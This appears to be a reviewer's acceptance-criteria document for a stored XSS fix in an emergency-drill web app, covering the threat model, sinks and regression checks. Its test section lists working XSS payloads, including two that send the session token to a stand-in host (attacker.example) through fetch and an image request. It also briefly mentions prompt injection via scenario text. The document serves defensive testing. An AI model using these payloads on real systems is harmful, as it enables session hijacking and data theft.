# XSS Acceptance Criteria — SR-01

Independent reviewer sign-off document for **SR-01 — Stored XSS through imported and locally
persisted application state** (see `SECURITY-REVIEW.md`, lines 15–36).

Role: independent reviewer. This document defines what "fixed" means for SR-01 before any
patch is approved to merge. It does not modify application code. It does not evaluate or
approve any AI-output rendering work — that is SR-02, and the boundary is drawn explicitly in
[Out of scope](#out-of-scope-boundary-sr-01-vs-sr-02) below.

Reviewed against commit `9a41104` (branch `agent/claude-xss-fix`, identical to `main` and to
`agent/codex-xss-fix` at review time — **no code fix has landed yet** on any branch). Findings
below are grounded in direct inspection of the current file, not solely the prose in
`SECURITY-REVIEW.md`.

## Threat model

**Asset at risk:** the signed bearer session token in `sessionStorage`
(`ai-emergency-digital-twin-prototype.html:1472`), and, transitively, everything that token can
do — call `/api/claude-proxy` as an `ic`/`safety` role (20 req/hour), call `/api/maps-config`,
and read/alter whatever the operator sees during a live drill or a real incident review.

**Attacker:** does not need valid credentials. Two independent delivery paths exist because the
sinks trust *data*, not the channel it arrived through:

1. **Import path.** `importState()` (`:1615-1636`) reads an arbitrary user-selected `.json` file
   with `FileReader`, `JSON.parse`s it, and assigns `scenarios` / `car` / `verify` / `liveDrill`
   straight onto `state` with no schema check — only an `if(data.X)` truthy guard. A file can be
   handed to a victim by any of the normal social channels for a "backup restore" file: email
   attachment, Line/Slack file share, USB stick, or a compromised shared drive. `importState()`
   is nominally gated by `canUse('exportImport')` (`ic`/`safety` only), so the realistic victim is
   exactly the high-privilege operator whose token is worth stealing.
2. **Persisted-state path.** `loadState()` (`:1450-1463`) reads `localStorage['aidt_occ_state_v1']`
   on every page load with the same untyped assignment. Anything that can write to that
   `localStorage` key on the app's origin — a prior successful injection, a browser extension,
   a shared/kiosk machine, devtools access during handover between shifts — persists silently
   and detonates on the *next* reload, including for a different operator than the one who
   (unknowingly) saved it. This is the "stored" part of stored XSS: the payload survives reload,
   export, and re-import, and can move between machines via the legitimate backup file.

**Sinks (where untrusted state becomes markup), verified in the current file:**

| Sink | Location | Trigger |
|---|---|---|
| `renderScenarioList()` — `sc.name`, `scDesc(sc)` output, `sc.note` | `:2333-2348` | any scenario list view, immediately after import/reload |
| `scDesc()` interpolates `sc.type`, `sc.floorLabel`, `scOriginName(sc)` (itself reads `sc.originLabel` directly), `sc.time`, `sc.people`, `sc.casSeverity`, `sc.searchPriority`, `sc.trappedFloor`, `sc.spreadRate`, `sc.smokeLevel` | `:2317-2328` | feeds the sink above |
| `logEvent()` via `insertAdjacentHTML('beforeend', ...)` | `:2358-2362` | every simulation tick |
| Simulation start event interpolates `sc.fuelType`, `sc.smokeLevel`, `sc.toxicity`, `sc.spreadRate` unescaped into the string passed to `logEvent` | `:2423` | pressing ▶ รัน on a poisoned scenario |
| `buildAARFromSim()` interpolates `scName` (`sc.name`) and `sc.note` unescaped into the AAR HTML string later assigned via `innerHTML` | `:3215, :3223, :3231` | generating an AAR / AAR print view |
| Scenario `id` used unescaped inside inline `onclick="setActiveScenario(${sc.id})"` / `delScenario(${sc.id})` | `:2341-2343` | scenario list render, **for any imported scenario whose `id` is attacker-controlled and not numeric** — this is an attribute/JS-context breakout distinct from the HTML-context breakouts above and needs its own payload class |

**Sinks confirmed already safe (must not regress):** `renderCAR()` (`:2999-3001`) and
`renderVerify()` (`:2236-2242`) both already call the existing `esc()` helper (`:1900-1902`) on
every field, regardless of whether the row originated from manual entry or from
`importState()`/`loadState()`. These are in scope for the *regression checklist* (a fix must not
accidentally remove this escaping) but are not part of the vulnerability being fixed.

## Acceptance criteria

A fix satisfies SR-01 only if **all** of the following hold. Each must be independently
verifiable by a reviewer who did not write the patch.

1. **Schema enforcement on both entry points.** `importState()` and `loadState()` validate the
   parsed object against an explicit allow-list schema (per-field type, and for strings a
   maximum length and a rejection or escaping rule for control/markup characters) before any
   part of it is assigned to `state`. Unknown top-level or nested keys are dropped, not merged
   in. On the imported side: reject/attach an error toast, do not partially apply.
   Whole-object validation must be atomic — no field of `state` is updated if any field fails
   validation.
2. **Legacy/tainted state is not trusted silently.** Existing `localStorage` content written
   before the fix ships is treated as untrusted input on first load post-deploy: it goes through
   the same schema validation as import, and invalid/oversized/malformed entries are discarded
   (with the rest of valid state preserved, or the whole bucket dropped — either is acceptable,
   but silent pass-through of pre-fix data is not).
3. **No raw interpolation of state-derived strings into `innerHTML`/`insertAdjacentHTML`
   anywhere in the render path for scenarios, simulation events, and AAR.** Concretely:
   `renderScenarioList()`, `scDesc()`'s output, `logEvent()`, the `:2423` simulation-start string,
   and `buildAARFromSim()` (and the equivalent `buildAARFromLiveDrill()` / `buildAARFromDrill()`
   if they interpolate scenario/state fields — verify at patch time) must render every
   state-derived value through `esc()` (or equivalent `textContent`/DOM-construction) before it
   reaches an HTML string, with no exceptions for fields believed to be "internal" (`sc.id`,
   `sc.floor`, enums) — those must be validated as the expected type/enum by the schema in
   criterion 1, not merely assumed safe at render time. Defense in depth: both the schema
   validation *and* the render-time escaping must independently hold; passing only one is not
   sufficient.
4. **No inline event handlers built from state values.** `onclick="setActiveScenario(${sc.id})"`
   and the sibling handlers at `:2341-2343` are replaced with listeners bound in JS reading a
   validated identifier (e.g. from a `data-id` attribute set via `setAttribute`/DOM property, or
   from a closure over the already-validated in-memory object) — not with an attacker-influenced
   value concatenated into a string that becomes an inline handler.
5. **`esc()` regression coverage.** `renderCAR()` and `renderVerify()` continue to escape every
   field after the patch (criterion 3 must not be satisfied by refactoring these two functions in
   a way that removes existing escaping).
6. **No functional regression on legitimate data.** All existing scenario presets (A/B/C, G/H/I/J
   — see the parent `CLAUDE.md` invariant against deleting these), CAR items, verification rows,
   and a round-trip export → import of an untouched, legitimately-created state file behave
   identically before and after the patch: same rendered text, same active scenario, same
   simulation results (deterministic seeded RNG unaffected).
7. **Token exposure is unaffected either way.** This acceptance round does not require moving the
   session token out of `sessionStorage` — that is a separate, not-yet-filed hardening item
   (SR-01's remediation list item 5 talks about storage-key versioning, not token storage
   location). The bar here is that a stored-XSS payload can no longer execute in the first place,
   which removes the practical path to reading that token.

## Malicious test payloads

Apply each payload to **every string field enumerated below** via both entry points (a crafted
`.json` file through the Import button, and directly via
`localStorage.setItem('aidt_occ_state_v1', ...)` in devtools followed by reload) and via direct
manual entry in the Scenario Builder form where the field is user-editable, to confirm the same
protection applies regardless of channel.

**Fields to cover:** `scenarios[].name`, `scenarios[].note`, `scenarios[].type`,
`scenarios[].floorLabel`, `scenarios[].originLabel`, `scenarios[].time`,
`scenarios[].casSeverity`, `scenarios[].searchPriority`, `scenarios[].trappedFloor`,
`scenarios[].spreadRate`, `scenarios[].smokeLevel`, `scenarios[].fuelType`,
`scenarios[].toxicity`, `scenarios[].id` (non-numeric), `car[].item/found/owner/due`,
`verify[<floor>].by/date/note`, `liveDrill.note` and any other free-text `liveDrill` field
rendered by `renderLiveDrillResult()`.

**HTML-context breakout (targets `innerHTML`/`insertAdjacentHTML` sinks):**
```
<img src=x onerror="window.__xss_sentinel='img'">
<svg onload="window.__xss_sentinel='svg'"><animate onbegin="window.__xss_sentinel='anim'"></svg>
<script>window.__xss_sentinel='script'</script>
<iframe srcdoc="<script>parent.__xss_sentinel='iframe'</script>"></iframe>
"><img src=x onerror=window.__xss_sentinel='attr-break'>
</div><img src=x onerror=window.__xss_sentinel='tag-break'><div>
<a href="javascript:window.__xss_sentinel='href'">click</a>
```

**Attribute/inline-handler-context breakout (targets the `onclick="...(${sc.id})"` sink, `:2341-2343`):**
```
1);fetch('https://attacker.example/steal?t='+sessionStorage.getItem('aidt_session_token'));(1
1'-alert(document.domain)-'
0 onmouseover=window.__xss_sentinel='hover'
```
Use these as the value of `scenarios[].id` specifically (numeric field, so this also exercises
type validation, not just escaping).

**Boundary and volume cases (targets schema validation, criterion 1):**
```
a string 200,000 characters long in `note`
a `scenarios` array with 50,000 entries
`name` set to a number, an object, or an array instead of a string
`id` set to `null`, `undefined` (as JSON absence), a float, or a UUID string
an extra unexpected top-level key, e.g. `"__proto__": {"polluted": true}`
an extra unexpected key inside a scenario object, e.g. `scenarios[0].onload = "..."`
```

**Session-theft proof-of-concept (run once, in a disposable/test session only, to prove real
impact rather than just DOM execution):**
```
<img src=x onerror="new Image().src='https://attacker.example/c?t='+encodeURIComponent(sessionStorage.getItem('aidt_session_token'))">
```
Confirm before the fix that this fires (attacker-controlled request observed with the real
token attached), and confirm after the fix that the payload either never reaches `state` (schema
rejection) or renders as inert literal text with no outbound request.

**Instrumentation for every run:** set `window.onerror` and watch `window.__xss_sentinel` before
loading/importing; confirm it stays `undefined` after the fix, and confirm no unexpected network
request appears in the Network tab.

## Regression checklist

Run after any candidate SR-01 patch, in this order, on both a fresh session and a session with
pre-fix `localStorage` state present:

1. **Baseline sanity.** All shipped presets (A, B, C, G, H, I, J) still load, run, and produce the
   same deterministic simulation result and AAR content as before the patch (spot-check one KPI
   number per preset against a pre-patch run).
2. **Legitimate round-trip.** Create a new scenario with Thai text, an ampersand, a quote mark,
   and a `<` in the note field as ordinary user content (e.g. `note: "ปิด < 2 ทางออก & ยืนยันด้วย "IC""`).
   Export, clear state, re-import. Confirm the text renders correctly (escaped-but-legible) and
   is not corrupted or double-escaped.
3. **Import rejection is atomic.** Import a file where one scenario is valid and a second is
   malformed/oversized. Confirm nothing from that file is applied — not even the valid scenario
   — and the error is surfaced to the user.
4. **Legacy-state handling.** Manually seed `localStorage['aidt_occ_state_v1']` with a payload
   from the list above, reload without importing anything, and confirm it is discarded or shown
   as inert text, not executed, and that this doesn't wipe unrelated legitimate legacy fields it
   didn't need to touch (unless the chosen remediation is "drop the whole bucket," in which case
   confirm that's a deliberate, documented choice per criterion 2).
5. **Full sink sweep.** Exercise, with a payload present: scenario list (`renderScenarioList`),
   simulation event log (`logEvent`/`:2423`), CAR table, verification table, live-drill result
   view, OCC Drill 2568 view, AI AAR report (template portion only — see out-of-scope below),
   and the print/report CSS view (`@media print` — printing doesn't re-run JS but confirm the
   DOM it prints from is the same sanitized DOM, not a second unsanitized render path).
6. **CAR/Verify non-regression.** Re-run the SR-01 payload list against `car[]` and `verify[]`
   fields and confirm `esc()` is still applied — i.e. the patch didn't touch `renderCAR()`/
   `renderVerify()` in a way that removed existing protection.
7. **RBAC untouched.** `canUse('exportImport')` gating on Import/Export buttons still works
   per role; the patch must not weaken or bypass the existing RBAC checks while fixing the
   escaping/validation.
8. **No console errors under valid input.** Normal scenario creation, simulation run, and AAR
   generation with only legitimate Thai/English text produce no new console errors or broken
   rendering (schema validation must not be so strict it rejects real accented/Thai text, emoji
   in notes, or existing preset data shapes).

## Out-of-scope boundary: SR-01 vs SR-02

SR-01 and SR-02 are both "unescaped `innerHTML`" in the same file, so it is easy to conflate
them. This review draws the line by **data origin**, not by which DOM sink is used:

- **In scope for SR-01 (this document):** any value that originates from `state` — i.e. from
  `importState()` (`:1615-1636`), `loadState()`/`localStorage` (`:1450-1463`), or the Scenario
  Builder form fields that get written into `state.scenarios`/`state.car`/`state.verify`/
  `state.liveDrill` — and is later rendered. This covers `renderScenarioList()`, `scDesc()`,
  `logEvent()`/`:2423`, `renderCAR()`, `renderVerify()`, `renderLiveDrillResult()`, `renderOCC()`,
  and the **template-only** portions of `buildAARFromSim()` / `buildAARFromDrill()` /
  `buildAARFromLiveDrill()` — specifically `scName` (`:3215`) and `sc.note` (`:3231`), which are
  scenario state, not model output.
- **Out of scope for SR-01, belongs to SR-02:** the `text` returned by `callClaudeAPI()` inside
  `buildAIInsight()` (`:3146-3163`) and interpolated at `:3162` into a fragment that is appended
  to the AAR HTML at `genAAR()` (`:3174-3184`) and assigned to `$('#aar-report').innerHTML`
  (`:3184`). Even though this fragment lands in the *same* `#aar-report` element as the SR-01
  template content, the trust boundary being crossed is different: SR-01 is "the browser
  trusting its own stored/imported state," SR-02 is "the server-side proxy and browser trusting
  Anthropic's model output (and by extension, prompt injection via scenario/CAR text that gets
  embedded in the prompt at `:3159`)." A schema-and-escaping fix for SR-01 does **not** need to
  touch `callClaudeAPI()`, the system/user prompt construction, or the HTML-allow-list
  sanitization SR-02's remediation calls for. Conversely, an SR-02 fix (allow-list sanitizing
  Claude's HTML output) does not satisfy any SR-01 acceptance criterion above, because it does
  nothing about `importState()`/`loadState()` lacking a schema, or about the scenario-list/sim-log
  sinks rendering `state` fields unescaped.
- **Explicitly not evaluated by this document:** `api/claude-proxy.js` request validation
  (SR-03), rate-limiting durability (SR-04), and response security headers/CSP (SR-05). A CSP is
  named in SR-01's remediation list as defense-in-depth, but this acceptance round can be
  satisfied without one; CSP work is tracked and reviewed separately.

If a submitted patch touches `callClaudeAPI()`, the AI system prompt, or adds HTML sanitization
for model output, that portion is out of scope for SR-01 sign-off and should be reviewed instead
against SR-02's own criteria.
